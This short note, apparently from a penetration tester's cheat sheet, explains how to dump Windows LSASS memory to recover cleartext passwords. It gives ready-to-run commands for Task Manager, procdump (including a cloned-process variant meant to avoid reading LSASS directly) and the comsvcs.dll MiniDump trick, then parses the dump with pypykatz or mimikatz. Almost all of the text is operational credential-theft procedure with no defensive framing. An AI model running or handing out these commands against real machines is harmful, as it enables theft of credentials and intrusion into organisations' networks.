For quick and easy, you can map `\\live.sysinternals.com\` or go to https://live.sysinternals.com/ to download sysinternal tools

Dumping lsass to find cleartext password:
Using windows task manager (with administrator privilege): right click on lsass.exe -> create dump file
Using procdump: 
```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# or avoid reading lsass by dumping a cloned lsass process
procdump.exe -accepteula -r -ma lsass.exe lsass.dmp
```
Or using comsvcs.dll: `rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full`

Then either use https://github.com/skelsec/pypykatz or `mimikatz.exe` + `sekurlsa::minidump {location for lsass.dmp}` 